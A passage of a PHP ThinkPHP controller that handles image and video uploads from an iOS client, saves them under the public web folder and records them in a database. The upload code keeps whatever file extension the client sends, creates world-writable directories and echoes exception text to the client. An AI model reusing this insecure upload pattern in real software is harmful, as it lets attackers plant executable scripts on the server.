                    'login_time' => time(),
                    'ip' => request()->ip()
                ]);
                
                if (!$userIdValue) {
                    trace("创建用户失败: {$userid}", 'error');
                    exit('用户创建失败');
                }
            }
            
            // 判断是否为视频文件
            $isVideo = strtolower($fileType) === 'video';
            if (!$isVideo) {
                // 检查文件扩展名判断是否为视频
                $extension = strtolower($file->getOriginalExtension());
                if (empty($extension) && method_exists($file, 'getExtension')) {
                    $extension = strtolower($file->getExtension());
                }
                $videoExtensions = ['mp4', 'mov', 'm4v', '3gp', 'avi', 'wmv'];
                $isVideo = in_array($extension, $videoExtensions);
            }
            
            // 为调试输出文件信息
            if ($file && method_exists($file, 'getInfo')) {
                $info = $file->getInfo();
                trace("上传文件信息: ".json_encode($info), 'info');
            }
            
            // 创建保存目录
            $rootPath = app()->getRootPath() . 'public';
            $relativePath = "/image/" . date("Ymd", time());
            $path = $rootPath . $relativePath;
            
            if (!is_dir($path)) {
                mkdir($path, 0777, true);
            }
            
            // 根据文件类型设置文件名
            $prefix = $isVideo ? "ios_video_" : "ios_";
            if ($file->getOriginalExtension()) {
                $extension = $file->getOriginalExtension();
            } else if (method_exists($file, 'getExtension')) {
                $extension = $file->getExtension();
            } else {
                $extension = $isVideo ? "mp4" : "png";
            }
            
            $fileName = $prefix . date("His", time()) . "_" . rand(1111, 9999) . '.' . $extension;
            
            // 移动上传文件到指定位置
            try {
                // 尝试直接使用move_uploaded_file函数移动
                if (isset($_FILES['file']) && is_uploaded_file($_FILES['file']['tmp_name'])) {
                    $tmpFile = $_FILES['file']['tmp_name'];
                    $targetFile = $path . "/" . $fileName;
                    
                    // 直接移动上传的文件
                    if (move_uploaded_file($tmpFile, $targetFile)) {
                        $info = true; // 标记移动成功
                    } else {
                        trace("移动文件失败，使用ThinkPHP方法尝试", 'info');
                        $info = $file->move($path, $fileName);
                    }
                } else {
                    // 使用ThinkPHP的move方法
                    $info = $file->move($path, $fileName);
                }
            } catch (\Exception $e) {
                trace("文件移动异常: " . $e->getMessage(), 'error');
                // 尝试直接保存文件内容
                if (isset($_FILES['file']) && file_exists($_FILES['file']['tmp_name'])) {
                    $content = file_get_contents($_FILES['file']['tmp_name']);
                    if ($content !== false) {
                        $targetFile = $path . "/" . $fileName;
                        if (file_put_contents($targetFile, $content)) {
                            $info = true; // 标记保存成功
                        } else {
                            trace("直接写入文件失败", 'error');
                            $info = false;
                        }
                    } else {
                        trace("读取临时文件失败", 'error');
                        $info = false;
                    }
                } else {
                    trace("没有有效的文件数据", 'error');
                    $info = false;
                }
            }
            
            if (!$info) {
                trace("文件保存失败", 'error');
                exit($isVideo ? "视频保存失败" : "图片保存失败");
            }
            
            $filePath = $relativePath . "/" . $fileName;
            
            // 记录成功信息
            if ($isVideo) {
                trace("视频保存成功: {$fileName}", 'info');
            } else {
                trace("图片保存成功: {$fileName}", 'info');
            }
            
            // 检查数据表结构
            $tableInfo = $this->checkTableStructure('img');
            if (!$tableInfo['status']) {
                trace("获取数据表结构失败: " . $tableInfo['message'], 'error');
            } else {
                trace("数据表字段: " . json_encode($tableInfo['fields']), 'info');
            }
            
            // 插入数据库（重复内容自动忽略）
            $result = $this->saveImageRecordIfNotDuplicate($userIdValue, $filePath, $isVideo ? 1 : 0);
            
            if ($result) {
                exit("成功");
            } else {
                exit("成功(重复文件已忽略)");
            }
        } catch (\Exception $e) {
            // 记录详细错误
            trace("文件上传处理错误: " . $e->getMessage(), 'error');
            exit("错误: " . $e->getMessage());
        }
    }

    /**
     * 检查数据库表结构
     * 
     * @param string $tableName 表名
     * @return array 表结构信息
     */
    private function checkTableStructure($tableName) {
        try {
            // 先尝试使用ThinkPHP的方法获取字段
            $fields = Db::name($tableName)->getFieldsType();
            if (!empty($fields)) {
                return [
                    'status' => true,
                    'fields' => $fields,
                    'message' => '获取字段成功'
                ];
            }
            
            // 如果上面的方法失败，使用原始SQL查询
            $sql = "SHOW COLUMNS FROM " . config('database.connections.mysql.prefix') . $tableName;
            $columns = Db::query($sql);
            
            if (!empty($columns)) {
                $fields = [];
                foreach ($columns as $column) {
                    $fields[$column['Field']] = $column['Type'];
                }
                
                return [
                    'status' => true,
                    'fields' => $fields,
                    'message' => '通过SQL获取字段成功'
                ];
            }
            
            return [
                'status' => false,
                'fields' => [],
                'message' => '无法获取表结构'
            ];
        } catch (\Exception $e) {
            return [
                'status' => false,
                'fields' => [],
                'message' => '获取表结构失败: ' . $e->getMessage()
            ];
        }
    }
}